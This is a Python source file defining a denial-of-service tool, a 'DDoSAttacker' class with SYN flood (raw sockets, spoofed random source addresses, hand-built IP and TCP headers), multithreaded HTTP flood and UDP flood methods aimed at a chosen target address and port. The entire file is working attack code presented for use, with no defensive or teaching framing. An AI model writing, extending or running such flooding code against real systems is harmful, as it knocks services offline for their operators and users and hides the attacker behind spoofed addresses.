import socket
import threading
import time
import random
import requests
import ssl

class DDoSAttacker:
    def __init__(self):
        self.attack_running = False
        self.packets_sent = 0
    
    def syn_flood(self, target_ip, target_port=80, duration=30):
        print(f"\n\033[1;31m[+] Starting SYN Flood attack on {target_ip}:{target_port}\033[0m")
        print(f"[+] Attack duration: {duration} seconds")
        print("[+] Press Ctrl+C to stop the attack\n")
        
        self.attack_running = True
        self.packets_sent = 0
        start_time = time.time()
        
        # Create multiple threads for the attack
        threads = []
        for i in range(10):  # 10 threads for more power
            thread = threading.Thread(target=self._syn_flood_thread, 
                                    args=(target_ip, target_port, duration, start_time))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Wait for attack to complete or be stopped
        try:
            while time.time() - start_time < duration and self.attack_running:
                time.sleep(0.5)
                print(f"\r[+] Packets sent: {self.packets_sent}", end="")
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user")
        finally:
            self.attack_running = False
            for thread in threads:
                thread.join(timeout=1)
            
            print(f"\n[+] SYN Flood attack completed. Total packets sent: {self.packets_sent}")
    
    def _syn_flood_thread(self, target_ip, target_port, duration, start_time):
        while time.time() - start_time < duration and self.attack_running:
            try:
                # Create a raw socket (requires root privileges)
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                
                # Set the IP header manually
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Generate random source IP
                source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                
                # Craft the IP header
                ip_header = self._craft_ip_header(source_ip, target_ip)
                
                # Craft the TCP header
                tcp_header = self._craft_tcp_header(source_ip, target_ip, target_port, 0)
                
                # Send the packet
                s.sendto(ip_header + tcp_header, (target_ip, 0))
                self.packets_sent += 1
                
                s.close()
            except PermissionError:
                # If we don't have raw socket privileges, use a regular socket
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect((target_ip, target_port))
                    self.packets_sent += 1
                    s.close()
                except:
                    pass
            except:
                pass
    
    def http_flood(self, target_ip, target_port=80, duration=30):
        print(f"\n\033[1;31m[+] Starting HTTP Flood attack on {target_ip}:{target_port}\033[0m")
        print(f"[+] Attack duration: {duration} seconds")
        print("[+] Press Ctrl+C to stop the attack\n")
        
        self.attack_running = True
        self.packets_sent = 0
        start_time = time.time()
        
        # Determine protocol based on port
        protocol = "https" if target_port == 443 else "http"
        base_url = f"{protocol}://{target_ip}"
        
        # Add port if it's not the default for the protocol
        if not ((protocol == "http" and target_port == 80) or (protocol == "https" and target_port == 443)):
            base_url += f":{target_port}"
        
        # Create multiple threads for the attack
        threads = []
        for i in range(50):  # 50 threads for HTTP flood
            thread = threading.Thread(target=self._http_flood_thread, 
                                    args=(base_url, duration, start_time))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Wait for attack to complete or be stopped
        try:
            while time.time() - start_time < duration and self.attack_running:
                time.sleep(0.5)
                print(f"\r[+] Requests sent: {self.packets_sent}", end="")
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user")
        finally:
            self.attack_running = False
            for thread in threads:
                thread.join(timeout=1)
            
            print(f"\n[+] HTTP Flood attack completed. Total requests sent: {self.packets_sent}")
    
    def _http_flood_thread(self, base_url, duration, start_time):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        paths = ["/", "/index.html", "/home", "/api/v1/test", "/wp-admin", "/admin"]
        
        while time.time() - start_time < duration and self.attack_running:
            try:
                url = f"{base_url}{random.choice(paths)}"
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                # Use a session to keep connections alive
                with requests.Session() as session:
                    response = session.get(url, headers=headers, timeout=2, verify=False)
                    self.packets_sent += 1
            except requests.exceptions.SSLError:
                # If SSL fails, try without verification
                try:
                    response = requests.get(url, headers=headers, timeout=2, verify=False)
                    self.packets_sent += 1
                except:
                    self.packets_sent += 1  # Count failed requests too
            except:
                self.packets_sent += 1  # Count failed requests too
    
    def udp_flood(self, target_ip, target_port=80, duration=30):
        print(f"\n\033[1;31m[+] Starting UDP Flood attack on {target_ip}:{target_port}\033[0m")
        print(f"[+] Attack duration: {duration} seconds")
        print("[+] Press Ctrl+C to stop the attack\n")
        
        self.attack_running = True
        self.packets_sent = 0
        start_time = time.time()
        
        # Create multiple threads for the attack
        threads = []
        for i in range(10):  # 10 threads for UDP flood
            thread = threading.Thread(target=self._udp_flood_thread, 
                                    args=(target_ip, target_port, duration, start_time))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Wait for attack to complete or be stopped
        try:
            while time.time() - start_time < duration and self.attack_running:
                time.sleep(0.5)
                print(f"\r[+] UDP packets sent: {self.packets_sent}", end="")
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user")
        finally:
            self.attack_running = False
            for thread in threads:
                thread.join(timeout=1)
            
            print(f"\n[+] UDP Flood attack completed. Total packets sent: {self.packets_sent}")
    
    def _udp_flood_thread(self, target_ip, target_port, duration, start_time):
        while time.time() - start_time < duration and self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Generate random data
                data = random._urandom(1024)  # 1KB of random data
                
                # Send to target
                s.sendto(data, (target_ip, target_port))
                self.packets_sent += 1
                
                s.close()
            except:
                pass
    
    def _craft_ip_header(self, source_ip, dest_ip):
        # Simple IP header creation (simplified for example)
        ip_ver_ihl = 69  # Version 4, IHL 5 (5 * 4 = 20 bytes)
        ip_tos = 0       # Type of service
        ip_tot_len = 0   # Total length (kernel will fill)
        ip_id = 54321    # Identification
        ip_frag_off = 0  # Fragment offset
        ip_ttl = 255     # Time to live
        ip_proto = socket.IPPROTO_TCP  # Protocol (TCP)
        ip_check = 0     # Checksum (kernel will fill)
        
        # Convert IP addresses to binary form
        source_ip_bin = socket.inet_aton(source_ip)
        dest_ip_bin = socket.inet_aton(dest_ip)
        
        # Pack the IP header
        ip_header = bytes([ip_ver_ihl, ip_tos]) + \
                   ip_tot_len.to_bytes(2, 'big') + \
                   ip_id.to_bytes(2, 'big') + \
                   ip_frag_off.to_bytes(2, 'big') + \
                   bytes([ip_ttl, ip_proto]) + \
                   ip_check.to_bytes(2, 'big') + \
                   source_ip_bin + \
                   dest_ip_bin
        
        return ip_header
    
    def _craft_tcp_header(self, source_ip, dest_ip, dest_port, data_size=0):
        source_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 4294967295)
        ack_num = 0
        data_offset = 5 << 4  # Data offset (5 * 4 = 20 bytes)
        tcp_flags = 0x02      # SYN flag
        window_size = 5840    # Window size
        tcp_check = 0         # Checksum
        urg_ptr = 0           # Urgent pointer
        
        # Pack the TCP header (without options)
        tcp_header = source_port.to_bytes(2, 'big') + \
                    dest_port.to_bytes(2, 'big') + \
                    seq_num.to_bytes(4, 'big') + \
                    ack_num.to_bytes(4, 'big') + \
                    bytes([data_offset, tcp_flags]) + \
                    window_size.to_bytes(2, 'big') + \
                    tcp_check.to_bytes(2, 'big') + \
                    urg_ptr.to_bytes(2, 'big')
        
        # Pseudo header for checksum calculation
        source_ip_bin = socket.inet_aton(source_ip)
        dest_ip_bin = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header) + data_size
        
        psh = source_ip_bin + dest_ip_bin + \
             bytes([placeholder, protocol]) + \
             tcp_length.to_bytes(2, 'big') + \
             tcp_header
        
        # Calculate checksum
        tcp_check = self._calculate_checksum(psh)
        
        # Repack with correct checksum
        tcp_header = source_port.to_bytes(2, 'big') + \
                    dest_port.to_bytes(2, 'big') + \
                    seq_num.to_bytes(4, 'big') + \
                    ack_num.to_bytes(4, 'big') + \
                    bytes([data_offset, tcp_flags]) + \
                    window_size.to_bytes(2, 'big') + \
                    tcp_check.to_bytes(2, 'big') + \
                    urg_ptr.to_bytes(2, 'big')
        
        return tcp_header
    
    def _calculate_checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
            checksum = (checksum & 0xffff) + (checksum >> 16)
        
        return ~checksum & 0xffff
